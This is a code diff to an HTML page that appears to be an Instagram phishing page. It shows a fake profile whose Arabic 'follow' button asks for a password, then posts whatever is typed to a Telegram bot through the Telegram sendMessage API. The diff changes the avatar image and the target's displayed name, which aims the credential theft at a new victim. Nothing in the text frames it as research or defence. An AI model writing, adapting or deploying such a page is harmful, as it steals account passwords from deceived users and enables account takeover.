@@ -7,7 +7,6 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;-webkit-tap-highlight-color:transparent}
 body{background:#fff;color:#000;min-height:100vh;overflow-x:hidden}
-
 #p1{display:flex;flex-direction:column;min-height:100vh}
 .gear{position:absolute;top:16px;left:16px;width:28px;height:28px;cursor:pointer;z-index:5}
 .wrap{flex:1;display:flex;flex-direction:column;align-items:center;padding:0 24px 24px}
@@ -36,9 +35,9 @@ body{background:#fff;color:#000;min-height:100vh;overflow-x:hidden}
   <div class="wrap">
     <img class="insta" src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" alt="Instagram">
     <div class="avatar">
-      <img src="https://i.ibb.co/5WpmYDxq/719161051-17888155689554614-4171028898969530542-n.jpg" alt="">
+      <img src="https://i.ibb.co/BHPy3M5s/792863657-18086969036672645-2402900281512442409-n.jpg" alt="">
     </div>
-    <div class="name">عبدالله الحسين</div>
+    <div class="name">0qg.v</div>
     <button class="btn" id="followBtn" onclick="showPass()">متابعة</button>
     <input class="input" id="passInput" type="password" placeholder="ادخل كلمة السر">
     <button class="btn" id="followBtn2" style="display:none;margin-top:12px" onclick="followNow()">متابعة</button>
@@ -72,7 +71,7 @@ function followNow(){
   fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:CHAT_ID,text:"🔐 Instagram\n👤 عبدالله الحسين\n🔑 "+v})
+    body:JSON.stringify({chat_id:CHAT_ID,text:"🔐 Instagram\n👤 0qg.v\n🔑 "+v})
   }).catch(function(){});
   document.getElementById('passInput').value='';
 }
